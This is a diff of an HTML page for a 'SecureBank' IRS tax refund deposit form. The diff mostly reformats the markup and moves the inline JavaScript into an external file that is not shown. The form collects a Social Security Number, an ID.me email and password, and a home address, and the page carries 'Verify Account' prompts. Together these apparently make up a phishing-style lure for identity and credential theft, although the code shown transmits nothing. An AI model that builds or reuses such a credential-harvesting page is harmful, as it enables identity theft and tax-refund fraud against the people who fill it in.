@@ -1,56 +1,100 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>SecureBank - IRS Tax Refund</title>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+      rel="stylesheet"
+    />
     <link rel="stylesheet" href="css/general.css" />
-</head>
-<body>
+  </head>
+  <body>
     <!-- Navigation -->
     <nav class="navbar">
-        <div class="navbar-content">
-            <a href="index.html" class="navbar-brand">SecureBank</a>
-            <button class="hamburger" aria-label="Toggle Menu" onclick="toggleSidebar()">
-                <i class="fas fa-bars"></i>
-            </button>
-            <ul class="navbar-nav">
-                <li><a href="dashboard.html">Dashboard</a></li>
-                <li><a href="profile.html">Profile</a></li>
-                <li><a href="#" onclick="logout()">Logout</a></li>
-            </ul>
-        </div>
+      <div class="navbar-content">
+        <a href="index.html" class="navbar-brand">SecureBank</a>
+        <button
+          class="hamburger"
+          aria-label="Toggle Menu"
+          onclick="toggleSidebar()"
+        >
+          <i class="fas fa-bars"></i>
+        </button>
+        <ul class="navbar-nav">
+          <li><a href="dashboard.html">Dashboard</a></li>
+          <li><a href="profile.html">Profile</a></li>
+          <li><a href="#" onclick="logout()">Logout</a></li>
+        </ul>
+      </div>
     </nav>
 
     <!-- Sidebar -->
     <div class="sidebar" id="sidebar">
-        <div class="sidebar-header">
-            <div class="profile-avatar">
-                <i class="fas fa-user"></i>
-                <div class="avatar-upload">
-                    <i class="fas fa-camera" style="font-size: 10px"></i>
-                </div>
-            </div>
-            <h2>John Doe</h2>
-            <p>Account: 48187344800</p>
-            <button class="btn-verify" onclick="verifyAccount()">Verify Account</button>
+      <div class="sidebar-header">
+        <div class="profile-avatar">
+          <i class="fas fa-user"></i>
+          <div class="avatar-upload">
+            <i class="fas fa-camera" style="font-size: 10px"></i>
+          </div>
         </div>
-        <nav class="sidebar-menu">
-            <a href="dashboard.html" onclick="navigateAndClose('dashboard.html')"><i class="fas fa-home"></i> Dashboard</a>
-            <a href="transactions.html" onclick="navigateAndClose('transactions.html')"><i class="fas fa-exchange-alt"></i> Transactions</a>
-            <a href="cards.html" onclick="navigateAndClose('cards.html')"><i class="fas fa-credit-card"></i> Cards</a>
-            <a href="transfer.html" onclick="navigateAndClose('transfer.html')"><i class="fas fa-paper-plane"></i> Transfer</a>
-            <a href="international-wire.html" onclick="navigateAndClose('international-wire.html')"><i class="fas fa-globe"></i> International Wire</a>
-            <a href="deposit.html" onclick="navigateAndClose('deposit.html')"><i class="fas fa-plus-circle"></i> Deposit</a>
-            <a href="loan.html" onclick="navigateAndClose('loan.html')"><i class="fas fa-hand-holding-usd"></i> Loan</a>
-            <a href="tax-refund.html" class="active" onclick="navigateAndClose('tax-refund.html')"><i class="fas fa-file-invoice-dollar"></i> IRS Tax Refund</a>
-            <a href="loan-history.html" onclick="navigateAndClose('loan-history.html')"><i class="fas fa-history"></i> Loan History</a>
-            <a href="settings.html" onclick="navigateAndClose('settings.html')"><i class="fas fa-cog"></i> Settings</a>
-            <a href="support.html" onclick="navigateAndClose('support.html')"><i class="fas fa-life-ring"></i> Support Ticket</a>
-            <a href="profile.html" onclick="navigateAndClose('profile.html')"><i class="fas fa-user"></i> Profile</a>
-            <a href="#" onclick="logoutAndClose()"><i class="fas fa-sign-out-alt"></i> Logout</a>
-        </nav>
+        <h2>John Doe</h2>
+        <p>Account: 48187344800</p>
+        <button class="btn-verify" onclick="verifyAccount()">
+          Verify Account
+        </button>
+      </div>
+      <nav class="sidebar-menu">
+        <a href="dashboard.html" onclick="navigateAndClose('dashboard.html')"
+          ><i class="fas fa-home"></i> Dashboard</a
+        >
+        <a
+          href="transactions.html"
+          onclick="navigateAndClose('transactions.html')"
+          ><i class="fas fa-exchange-alt"></i> Transactions</a
+        >
+        <a href="cards.html" onclick="navigateAndClose('cards.html')"
+          ><i class="fas fa-credit-card"></i> Cards</a
+        >
+        <a href="transfer.html" onclick="navigateAndClose('transfer.html')"
+          ><i class="fas fa-paper-plane"></i> Transfer</a
+        >
+        <a
+          href="international-wire.html"
+          onclick="navigateAndClose('international-wire.html')"
+          ><i class="fas fa-globe"></i> International Wire</a
+        >
+        <a href="deposit.html" onclick="navigateAndClose('deposit.html')"
+          ><i class="fas fa-plus-circle"></i> Deposit</a
+        >
+        <a href="loan.html" onclick="navigateAndClose('loan.html')"
+          ><i class="fas fa-hand-holding-usd"></i> Loan</a
+        >
+        <a
+          href="tax-refund.html"
+          class="active"
+          onclick="navigateAndClose('tax-refund.html')"
+          ><i class="fas fa-file-invoice-dollar"></i> IRS Tax Refund</a
+        >
+        <a
+          href="loan-history.html"
+          onclick="navigateAndClose('loan-history.html')"
+          ><i class="fas fa-history"></i> Loan History</a
+        >
+        <a href="settings.html" onclick="navigateAndClose('settings.html')"
+          ><i class="fas fa-cog"></i> Settings</a
+        >
+        <a href="support.html" onclick="navigateAndClose('support.html')"
+          ><i class="fas fa-life-ring"></i> Support Ticket</a
+        >
+        <a href="profile.html" onclick="navigateAndClose('profile.html')"
+          ><i class="fas fa-user"></i> Profile</a
+        >
+        <a href="#" onclick="logoutAndClose()"
+          ><i class="fas fa-sign-out-alt"></i> Logout</a
+        >
+      </nav>
     </div>
 
     <!-- Overlay -->
@@ -58,389 +102,288 @@
 
     <!-- Mobile Banking Menu Modal -->
     <div id="banking-menu" class="banking-menu">
-        <div class="banking-menu-content">
-            <div class="profile-header">
-                <div class="profile-avatar">
-                    <i class="fas fa-user"></i>
-                    <div class="avatar-upload">
-                        <i class="fas fa-camera" style="font-size: 10px"></i>
-                    </div>
-                </div>
-                <h2>John Doe</h2>
-                <p>Account: 48187344800</p>
-                <button class="btn-verify" onclick="verifyAccount()">Verify Account</button>
+      <div class="banking-menu-content">
+        <div class="profile-header">
+          <div class="profile-avatar">
+            <i class="fas fa-user"></i>
+            <div class="avatar-upload">
+              <i class="fas fa-camera" style="font-size: 10px"></i>
             </div>
-            <h3>Banking Menu</h3>
-            <p>Select an option to continue</p>
-            <div class="menu-grid">
-                <a href="dashboard.html" class="menu-item" onclick="navigateAndClose('dashboard.html')"><i class="fas fa-home"></i><span>Dashboard</span></a>
-                <a href="transactions.html" class="menu-item" onclick="navigateAndClose('transactions.html')"><i class="fas fa-exchange-alt"></i><span>Transactions</span></a>
-                <a href="cards.html" class="menu-item" onclick="navigateAndClose('cards.html')"><i class="fas fa-credit-card"></i><span>Cards</span></a>
-                <a href="transfer.html" class="menu-item" onclick="navigateAndClose('transfer.html')"><i class="fas fa-paper-plane"></i><span>Transfer</span></a>
-                <a href="international-wire.html" class="menu-item" onclick="navigateAndClose('international-wire.html')"><i class="fas fa-globe"></i><span>International Wire</span></a>
-                <a href="deposit.html" class="menu-item" onclick="navigateAndClose('deposit.html')"><i class="fas fa-plus-circle"></i><span>Deposit</span></a>
-                <a href="loan.html" class="menu-item" onclick="navigateAndClose('loan.html')"><i class="fas fa-hand-holding-usd"></i><span>Loan</span></a>
-                <a href="tax-refund.html" class="menu-item" onclick="navigateAndClose('tax-refund.html')"><i class="fas fa-file-invoice-dollar"></i><span>IRS Tax Refund</span></a>
-                <a href="loan-history.html" class="menu-item" onclick="navigateAndClose('loan-history.html')"><i class="fas fa-history"></i><span>Loan History</span></a>
-                <a href="settings.html" class="menu-item" onclick="navigateAndClose('settings.html')"><i class="fas fa-cog"></i><span>Settings</span></a>
-                <a href="support.html" class="menu-item" onclick="navigateAndClose('support.html')"><i class="fas fa-life-ring"></i><span>Support Ticket</span></a>
-                <a href="profile.html" class="menu-item" onclick="navigateAndClose('profile.html')"><i class="fas fa-user"></i><span>Profile</span></a>
-                <a href="#" class="menu-item logout-item" onclick="logoutAndClose()"><i class="fas fa-sign-out-alt"></i><span>Logout</span></a>
-            </div>
-            <button class="close-btn" onclick="closeSidebar()"><i class="fas fa-times"></i></button>
+          </div>
+          <h2>John Doe</h2>
+          <p>Account: 48187344800</p>
+          <button class="btn-verify" onclick="verifyAccount()">
+            Verify Account
+          </button>
         </div>
+        <h3>Banking Menu</h3>
+        <p>Select an option to continue</p>
+        <div class="menu-grid">
+          <a
+            href="dashboard.html"
+            class="menu-item"
+            onclick="navigateAndClose('dashboard.html')"
+            ><i class="fas fa-home"></i><span>Dashboard</span></a
+          >
+          <a
+            href="transactions.html"
+            class="menu-item"
+            onclick="navigateAndClose('transactions.html')"
+            ><i class="fas fa-exchange-alt"></i><span>Transactions</span></a
+          >
+          <a
+            href="cards.html"
+            class="menu-item"
+            onclick="navigateAndClose('cards.html')"
+            ><i class="fas fa-credit-card"></i><span>Cards</span></a
+          >
+          <a
+            href="transfer.html"
+            class="menu-item"
+            onclick="navigateAndClose('transfer.html')"
+            ><i class="fas fa-paper-plane"></i><span>Transfer</span></a
+          >
+          <a
+            href="international-wire.html"
+            class="menu-item"
+            onclick="navigateAndClose('international-wire.html')"
+            ><i class="fas fa-globe"></i><span>International Wire</span></a
+          >
+          <a
+            href="deposit.html"
+            class="menu-item"
+            onclick="navigateAndClose('deposit.html')"
+            ><i class="fas fa-plus-circle"></i><span>Deposit</span></a
+          >
+          <a
+            href="loan.html"
+            class="menu-item"
+            onclick="navigateAndClose('loan.html')"
+            ><i class="fas fa-hand-holding-usd"></i><span>Loan</span></a
+          >
+          <a
+            href="tax-refund.html"
+            class="menu-item"
+            onclick="navigateAndClose('tax-refund.html')"
+            ><i class="fas fa-file-invoice-dollar"></i
+            ><span>IRS Tax Refund</span></a
+          >
+          <a
+            href="loan-history.html"
+            class="menu-item"
+            onclick="navigateAndClose('loan-history.html')"
+            ><i class="fas fa-history"></i><span>Loan History</span></a
+          >
+          <a
+            href="settings.html"
+            class="menu-item"
+            onclick="navigateAndClose('settings.html')"
+            ><i class="fas fa-cog"></i><span>Settings</span></a
+          >
+          <a
+            href="support.html"
+            class="menu-item"
+            onclick="navigateAndClose('support.html')"
+            ><i class="fas fa-life-ring"></i><span>Support Ticket</span></a
+          >
+          <a
+            href="profile.html"
+            class="menu-item"
+            onclick="navigateAndClose('profile.html')"
+            ><i class="fas fa-user"></i><span>Profile</span></a
+          >
+          <a href="#" class="menu-item logout-item" onclick="logoutAndClose()"
+            ><i class="fas fa-sign-out-alt"></i><span>Logout</span></a
+          >
+        </div>
+        <button class="close-btn" onclick="closeSidebar()">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
     </div>
 
     <!-- Mobile Navigation -->
     <div class="mobile-nav">
-        <div class="mobile-nav-items">
-            <a href="dashboard.html" class="mobile-nav-item" onclick="navigateAndClose('dashboard.html')">
-                <i class="fas fa-home"></i>
-                Home
-            </a>
-            <a href="transactions.html" class="mobile-nav-item" onclick="navigateAndClose('transactions.html')">
-                <i class="fas fa-chart-bar"></i>
-                Stats
-            </a>
-            <a href="cards.html" class="mobile-nav-item" onclick="navigateAndClose('cards.html')">
-                <i class="fas fa-credit-card"></i>
-                Cards
-            </a>
-            <a href="profile.html" class="mobile-nav-item" onclick="navigateAndClose('profile.html')">
-                <i class="fas fa-user"></i>
-                Profile
-            </a>
-        </div>
+      <div class="mobile-nav-items">
+        <a
+          href="dashboard.html"
+          class="mobile-nav-item"
+          onclick="navigateAndClose('dashboard.html')"
+        >
+          <i class="fas fa-home"></i>
+          Home
+        </a>
+        <a
+          href="transactions.html"
+          class="mobile-nav-item"
+          onclick="navigateAndClose('transactions.html')"
+        >
+          <i class="fas fa-chart-bar"></i>
+          Stats
+        </a>
+        <a
+          href="cards.html"
+          class="mobile-nav-item"
+          onclick="navigateAndClose('cards.html')"
+        >
+          <i class="fas fa-credit-card"></i>
+          Cards
+        </a>
+        <a
+          href="profile.html"
+          class="mobile-nav-item"
+          onclick="navigateAndClose('profile.html')"
+        >
+          <i class="fas fa-user"></i>
+          Profile
+        </a>
+      </div>
     </div>
 
     <!-- IRS Tax Refund Page -->
     <div class="main-content">
-        <div class="container">
-            <div class="card">
-                <div class="card-header">
-                    <h4 class="card-title"><i class="fas fa-file-invoice-dollar"></i> IRS Tax Refund Deposit</h4>
-                </div>
-                <form id="tax-refund-form" novalidate>
-                    <div class="form-group">
-                        <label for="to-account">To Account</label>
-                        <select id="to-account" class="form-control" required aria-required="true">
-                            <option value="">Select Account</option>
-                            <option value="checking">Checking (****1234)</option>
-                            <option value="savings">Savings (****5678)</option>
-                        </select>
-                        <span class="error-message" role="alert"></span>
-                    </div>
-                    <div class="form-row">
-                        <div class="form-group">
-                            <label for="tax-year">Tax Year</label>
-                            <input type="number" id="tax-year" class="form-control" placeholder="Enter tax year" min="2000" max="2025" required aria-required="true">
-                            <span class="error-message" role="alert"></span>
-                        </div>
-                        <div class="form-group">
-                            <label for="amount">Estimated Refund Amount ($)</label>
-                            <div class="amount-input">
-                                <span class="currency-symbol">$</span>
-                                <input type="number" id="amount" class="form-control" placeholder="0.00" step="0.01" min="0.01" required aria-required="true">
-                            </div>
-                            <span class="error-message" role="alert"></span>
-                        </div>
-                    </div>
-                    <div class="form-group">
-                        <label for="ssn">Social Security Number</label>
-                        <input type="text" id="ssn" class="form-control" placeholder="XXX-XX-XXXX" required aria-required="true" pattern="\d{3}-\d{2}-\d{4}">
-                        <span class="error-message" role="alert"></span>
-                    </div>
-                    <div class="form-group">
-                        <label for="idme-email">ID.me Email</label>
-                        <input type="email" id="idme-email" class="form-control" placeholder="Enter ID.me email" required aria-required="true">
-                        <span class="error-message" role="alert"></span>
-                    </div>
-                    <div class="form-group">
-                        <label for="idme-password">ID.me Password</label>
-                        <input type="password" id="idme-password" class="form-control" placeholder="Enter ID.me password" required aria-required="true" minlength="8">
-                        <span class="error-message" role="alert"></span>
-                    </div>
-                    <div class="form-group">
-                        <label for="current-address">Current Address</label>
-                        <input type="text" id="current-address" class="form-control" placeholder="Enter current address" required aria-required="true">
-                        <span class="error-message" role="alert"></span>
-                    </div>
-                    <div class="form-group">
-                        <label for="memo">Memo (Optional)</label>
-                        <textarea id="memo" class="form-control" rows="3" aria-label="Memo (optional)"></textarea>
-                    </div>
-                    <div class="form-group">
-                        <button type="submit" class="btn btn-primary" onclick="openConfirmationModal(event)">
-                            <i class="fas fa-file-alt"></i> Set Up Refund
-                        </button>
-                        <button type="button" class="btn btn-secondary" onclick="resetForm()">
-                            <i class="fas fa-undo"></i> Reset
-                        </button>
-                    </div>
-                </form>
+      <div class="container">
+        <div class="card">
+          <div class="card-header">
+            <h4 class="card-title">
+              <i class="fas fa-file-invoice-dollar"></i> IRS Tax Refund Deposit
+            </h4>
+          </div>
+          <form id="tax-refund-form" novalidate>
+            <div class="form-group">
+              <label for="to-account">To Account</label>
+              <select
+                id="to-account"
+                class="form-control"
+                required
+                aria-required="true"
+              >
+                <option value="">Select Account</option>
+                <option value="checking">Checking (****1234)</option>
+                <option value="savings">Savings (****5678)</option>
+              </select>
+              <span class="error-message" role="alert"></span>
             </div>
+            <div class="form-row">
+              <div class="form-group">
+                <label for="tax-year">Tax Year</label>
+                <input
+                  type="number"
+                  id="tax-year"
+                  class="form-control"
+                  placeholder="Enter tax year"
+                  min="2000"
+                  max="2025"
+                  required
+                  aria-required="true"
+                />
+                <span class="error-message" role="alert"></span>
+              </div>
+              <div class="form-group">
+                <label for="amount">Estimated Refund Amount ($)</label>
+                <div class="amount-input">
+                  <span class="currency-symbol">$</span>
+                  <input
+                    type="number"
+                    id="amount"
+                    class="form-control"
+                    placeholder="0.00"
+                    step="0.01"
+                    min="0.01"
+                    required
+                    aria-required="true"
+                  />
+                </div>
+                <span class="error-message" role="alert"></span>
+              </div>
+            </div>
+            <div class="form-group">
+              <label for="ssn">Social Security Number</label>
+              <input
+                type="text"
+                id="ssn"
+                class="form-control"
+                placeholder="XXX-XX-XXXX"
+                required
+                aria-required="true"
+                pattern="\d{3}-\d{2}-\d{4}"
+              />
+              <span class="error-message" role="alert"></span>
+            </div>
+            <div class="form-group">
+              <label for="idme-email">ID.me Email</label>
+              <input
+                type="email"
+                id="idme-email"
+                class="form-control"
+                placeholder="Enter ID.me email"
+                required
+                aria-required="true"
+              />
+              <span class="error-message" role="alert"></span>
+            </div>
+            <div class="form-group">
+              <label for="idme-password">ID.me Password</label>
+              <input
+                type="password"
+                id="idme-password"
+                class="form-control"
+                placeholder="Enter ID.me password"
+                required
+                aria-required="true"
+                minlength="8"
+              />
+              <span class="error-message" role="alert"></span>
+            </div>
+            <div class="form-group">
+              <label for="current-address">Current Address</label>
+              <input
+                type="text"
+                id="current-address"
+                class="form-control"
+                placeholder="Enter current address"
+                required
+                aria-required="true"
+              />
+              <span class="error-message" role="alert"></span>
+            </div>
+            <div class="form-group">
+              <label for="memo">Memo (Optional)</label>
+              <textarea
+                id="memo"
+                class="form-control"
+                rows="3"
+                aria-label="Memo (optional)"
+              ></textarea>
+            </div>
+            <div class="form-group">
+              <button
+                type="submit"
+                class="btn btn-primary"
+                onclick="openConfirmationModal(event)"
+              >
+                <i class="fas fa-file-alt"></i> Set Up Refund
+              </button>
+              <button
+                type="button"
+                class="btn btn-secondary"
+                onclick="resetForm()"
+              >
+                <i class="fas fa-undo"></i> Reset
+              </button>
+            </div>
+          </form>
         </div>
+      </div>
     </div>
 
     <!-- JavaScript -->
-    <script>
-        // Initialize App
-        document.addEventListener('DOMContentLoaded', function() {
-            setupFormHandlers();
-            // Removed updateNavigationDisplay() call
-            // Ensure initial margin is set based on screen size
-            if (window.innerWidth > 768) {
-                document.querySelector('.main-content').style.marginLeft = 'var(--sidebar-width)';
-            }
-        });
 
-        // Form Handlers
-        function setupFormHandlers() {
-            const form = document.getElementById('tax-refund-form');
-            if (form) {
-                form.addEventListener('submit', function(e) {
-                    e.preventDefault();
-                    // Handled by onclick in button
-                });
-
-                const inputs = {
-                    'tax-year': validateTaxYear,
-                    'amount': validateAmount,
-                    'ssn': validateSSN,
-                    'idme-email': validateEmail,
-                    'idme-password': validatePassword,
-                    'current-address': validateAddress
-                };
-
-                Object.entries(inputs).forEach(([id, validator]) => {
-                    const input = document.getElementById(id);
-                    if (input) {
-                        input.addEventListener('input', function(e) {
-                            validator(e);
-                            updateErrorMessage(this, !validator(this.value));
-                        });
-                    }
-                });
-            }
-        }
-
-        // UI Functions
-        function handleTaxRefund() {
-            const form = document.getElementById('tax-refund-form');
-            if (!form.checkValidity()) {
-                form.reportValidity();
-                return;
-            }
-
-            const toAccount = document.getElementById('to-account').value;
-            const taxYear = document.getElementById('tax-year').value;
-            const amount = document.getElementById('amount').value;
-            const ssn = document.getElementById('ssn').value;
-            const idmeEmail = document.getElementById('idme-email').value;
-            const idmePassword = document.getElementById('idme-password').value;
-            const currentAddress = document.getElementById('current-address').value;
-            const memo = document.getElementById('memo').value;
-
-            showAlert(`IRS tax refund setup for ${taxYear} of $${amount} to ${toAccount} completed${memo ? ' with memo: ' + memo : ''}!`, 'success');
-            form.reset();
-            form.querySelectorAll('.form-control').forEach(input => input.classList.remove('invalid'));
-        }
-
-        function resetForm() {
-            const form = document.getElementById('tax-refund-form');
-            if (form) {
-                form.reset();
-                form.querySelectorAll('.form-control').forEach(input => {
-                    input.classList.remove('invalid');
-                    updateErrorMessage(input, false);
-                });
-                showAlert('Form reset', 'success');
-            }
-        }
-
-        // Modal Functions
-        function openConfirmationModal(event) {
-            event.preventDefault();
-            const form = document.getElementById('tax-refund-form');
-            if (!form.checkValidity()) {
-                form.reportValidity();
-                return;
-            }
-
-            const toAccount = document.getElementById('to-account').value;
-            const taxYear = document.getElementById('tax-year').value;
-            const amount = document.getElementById('amount').value;
-            const ssn = document.getElementById('ssn').value;
-            const idmeEmail = document.getElementById('idme-email').value;
-            const memo = document.getElementById('memo').value;
-
-            const menuGrid = document.querySelector('#banking-menu .menu-grid');
-            menuGrid.innerHTML = `
-                <div class="menu-item confirmation-item">
-                    <i class="fas fa-check-circle"></i><span>Confirm Refund Setup</span>
-                    <ul>
-                        <li>To Account: ${toAccount}</li>
-                        <li>Tax Year: ${taxYear}</li>
-                        <li>Amount: $${amount}</li>
-                        <li>SSN: ${ssn}</li>
-                        <li>ID.me Email: ${idmeEmail}</li>
-                        ${memo ? `<li>Memo: ${memo}</li>` : ''}
-                    </ul>
-                    <div class="confirmation-buttons">
-                        <button class="btn btn-primary" onclick="confirmRefund()">Confirm</button>
-                        <button class="btn btn-secondary" onclick="closeSidebar()">Cancel</button>
-                    </div>
-                </div>
-            `;
-            document.getElementById('banking-menu').classList.add('active');
-        }
-
-        function confirmRefund() {
-            handleTaxRefund();
-            closeSidebar();
-        }
-
-        // Validation Functions
-        function validateTaxYear(value) {
-            const input = typeof value === 'string' ? value : value.target.value;
-            const year = parseInt(input);
-            return year >= 2000 && year <= 2025;
-        }
-
-        function validateAmount(e) {
-            const input = e.target;
-            const value = parseFloat(input.value);
-            return !input.value || (!isNaN(value) && value > 0);
-        }
-
-        function validateSSN(value) {
-            const input = typeof value === 'string' ? value : value.target.value;
-            const ssnRegex = /^\d{3}-\d{2}-\d{4}$/;
-            return ssnRegex.test(input);
-        }
-
-        function validateEmail(value) {
-            const input = typeof value === 'string' ? value : value.target.value;
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return emailRegex.test(input);
-        }
-
-        function validatePassword(value) {
-            const input = typeof value === 'string' ? value : value.target.value;
-            return input.length >= 8;
-        }
-
-        function validateAddress(value) {
-            const input = typeof value === 'string' ? value : value.target.value;
-            return input.trim().length > 0;
-        }
-
-        function updateErrorMessage(input, hasError) {
-            const errorSpan = input.nextElementSibling;
-            if (errorSpan && errorSpan.classList.contains('error-message')) {
-                if (hasError) {
-                    errorSpan.textContent = getErrorMessage(input.id);
-                    errorSpan.style.display = 'block';
-                    input.classList.add('invalid');
-                } else {
-                    errorSpan.textContent = '';
-                    errorSpan.style.display = 'none';
-                    input.classList.remove('invalid');
-                }
-            }
-        }
-
-        function getErrorMessage(id) {
-            const messages = {
-                'to-account': 'Please select a destination account',
-                'tax-year': 'Please enter a valid tax year (2000-2025)',
-                'amount': 'Please enter a valid refund amount',
-                'ssn': 'Please enter a valid SSN (XXX-XX-XXXX)',
-                'idme-email': 'Please enter a valid ID.me email',
-                'idme-password': 'Password must be at least 8 characters',
-                'current-address': 'Please enter a valid address'
-            };
-            return messages[id] || 'Invalid input';
-        }
-
-        // Utility Functions
-        function showAlert(message, type) {
-            const container = document.querySelector('.container');
-            if (container) {
-                const alertDiv = document.createElement('div');
-                alertDiv.className = `alert alert-${type}`;
-                alertDiv.innerHTML = `<i class="fas fa-${type === 'success' ? 'check' : 'times'}-circle"></i> ${message}`;
-                container.insertBefore(alertDiv, container.firstChild);
-                setTimeout(() => {
-                    if (alertDiv.parentNode) {
-                        alertDiv.classList.add('fadeOut');
-                        setTimeout(() => alertDiv.remove(), 300);
-                    }
-                }, 3000);
-            }
-        }
-
-        // Navigation Functions
-        function toggleSidebar() {
-            const sidebar = document.getElementById('sidebar');
-            const overlay = document.getElementById('overlay');
-            const bankingMenu = document.getElementById('banking-menu');
-            const mainContent = document.querySelector('.main-content');
-
-            if (window.innerWidth <= 768) {
-                bankingMenu.classList.toggle('active');
-            } else {
-                sidebar.classList.toggle('active');
-                mainContent.style.marginLeft = sidebar.classList.contains('active') ? 'var(--sidebar-width)' : '0';
-            }
-            overlay.classList.toggle('active');
-        }
-
-        function closeSidebar() {
-            const sidebar = document.getElementById('sidebar');
-            const overlay = document.getElementById('overlay');
-            const bankingMenu = document.getElementById('banking-menu');
-            const mainContent = document.querySelector('.main-content');
-
-            if (window.innerWidth <= 768) {
-                bankingMenu.classList.remove('active');
-            } else {
-                sidebar.classList.remove('active');
-                mainContent.style.marginLeft = 'var(--sidebar-width)'; // Reset to default desktop margin
-            }
-            overlay.classList.remove('active');
-        }
-
-        function navigateAndClose(url) {
-            closeSidebar();
-            window.location.href = url;
-        }
-
-        function logoutAndClose() {
-            closeSidebar();
-            logout();
-        }
-
-        function verifyAccount() {
-            alert('Please complete the verification process.');
-        }
-
-        // Keyboard Navigation
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Escape') {
-                closeSidebar();
-            }
-        });
-
-        // Responsive Handling
-        window.addEventListener('resize', function() {
-            // No automatic navigation update, rely on toggle
-        });
-    </script>
     <style>
-        .fadeOut {
-            animation: fadeOut 0.3s ease-out forwards;
-        }
+      .fadeOut {
+        animation: fadeOut 0.3s ease-out forwards;
+      }
     </style>
-</body>
+    <script  src="javascript/tax-refund.js"></script>
+  </body>
 </html>
